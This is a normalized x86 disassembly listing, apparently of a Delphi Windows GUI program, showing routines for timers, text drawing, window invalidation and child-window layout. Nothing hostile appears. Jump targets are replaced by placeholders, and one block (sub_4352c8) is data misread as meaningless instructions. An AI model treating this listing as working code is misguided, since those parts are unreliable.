mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
sub ecx 0x2
xor edx edx
xor eax eax
call sub_41919c
lea eax [ ebp - 0x1c ]
call sub_43467c
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_43476c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x1
mov ecx 0x1
xor edx edx
mov eax [ ebp - 0xc ]
call sub_43476c
pop ecx
jmp r-xdata
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_43476c
pop ecx
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_43476c
pop ecx
jmp r-xdata
push ebp
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_43476c
pop ecx
push ebp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_43476c
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x2
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_43476c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_43476c
pop ecx
sub_434a34
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ffc4
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_434abc
call sub_421110
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_434a84
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_434b30
mov eax [ esi + 0x34 ]
call sub_4211c4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_434abc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_434af6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434b30
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_434baf
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434bb6
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
sub_434c08
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4524a0
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
add esp 0xfffffff0
call sub_403578
mov edx 0xb9
mov eax esi
call sub_449774
mov edx 0x29
mov eax esi
call sub_449798
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_435058
mov edx 0x1
mov eax esi
call sub_435074
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_44a158
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_450a6c
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_434ccc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d62c
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_434d3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44fdb8
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_44dd40
sub_434d7c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434e6c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_449fb8
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_44ec7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434e73
lea eax [ ebp - 0x14 ]
call sub_403fa4
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4507d8
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4507d8
push eax
call InvalidateRect
sub_434e7c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_434eb4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_435016
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_433d68
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_434e7c
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_433d68
mov esi [ ebx + 0x208 ]
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
push ebp
call sub_434e7c
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_433d68
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_423c94
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4240b4
mov eax ebx
call sub_4519d8
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_44c298
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_449fb8
mov eax [ ebp - 0x1c ]
call sub_404464
push eax
mov eax esi
call sub_424598
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43501d
lea eax [ ebp - 0x1c ]
call sub_403fa4
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_423db0
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_424494
mov edx r-xdata
mov eax esi
call sub_4243f0
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_4350c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c80c
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_435120
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44f434
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_435241
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44f434
call sub_403a8c
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_449798
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_449774
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_43525c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_451320
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_435288
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_4519e0
pop esi
pop ebx
retn
sub_4352c8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebx + eax * 2 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add al 0x42
inc ebx
add ah dh
push ebx
inc ebx
add [ edx + eax ] bl
add [ eax ] al
sbb al 0xe3
inc ebx
add [ edi + eax ] dh
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add al dl
cmove eax [ eax ]
hlt
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax - 0xfffbcac ] dh
adc al [ ebp ]
loopne r-xdata
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ eax ] bl
jecxz r-xdata
xor al 0x7
add [ edi + eax + 0x42 ] dl
add al bh
push ss
inc esp
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
sub_43542c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_4416f8
mov edx edi
mov eax [ esi + 0x210 ]
call sub_41a474
xor edx edx
mov eax edi
call sub_449ed8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_44a12c
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_43585c
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4354b0
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_41a714
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44c5f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_4354e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_43554d
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4419f8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_435552
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46ad0c
call sub_403a5c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435578
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_44f784
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403450
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_4355b8
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_44f5cc
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403450
pop edx
pop esi
pop ebx
retn
sub_4355e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43f938
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_435894
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_435674
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_435908
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403254
mov eax [ esi + 0x210 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4524fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_4356c4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_4234bc
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_43584d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_4507d8
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_449ed8
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_4499bc
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_41a5d0
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403450
test al al
je r-xdata
sub_43585c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_41a62c
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_449bc4
mov eax ebx
mov si 0xffeb
call sub_403450
sub_435894
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_435a0c
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_435908
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43542c
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_41a6b8
call sub_403254
pop edi
pop esi
pop ebx
retn
sub_435948
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_4356c4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_435980
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_41a5d0
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_41a5d0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_435a0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_435ad5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_435908
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_4356c4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435adc
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_41a5d0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_41a5d0
pop edx
call sub_449fe8
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_435ae4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44fc8c
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_41a5d0
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_435b58
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451a20
mov [ esi + 0x16c ] 0x1
mov dl 0x3
mov eax esi
call sub_4494cc
mov edx 0x3
mov eax esi
call sub_449774
mov dx 0xfff2
mov eax esi
call sub_44a1c4
mov [ esi + 0x188 ] 0x1e
mov [ esi + 0x1a8 ] 0x3
mov [ esi + 0x1a0 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_435bd0
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x170 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451a7c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_435c00
push ebx
push esi
mov ebx eax
push 0x412
push 0x0
mov eax [ ebx + 0x30 ]
call sub_4507d8
push eax
call GetDCEx
mov [ ebx + 0x180 ] eax
cmp [ ebx + 0x1a8 ] 0x3
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
mov eax [ ebx + 0x170 ]
call sub_423cc8
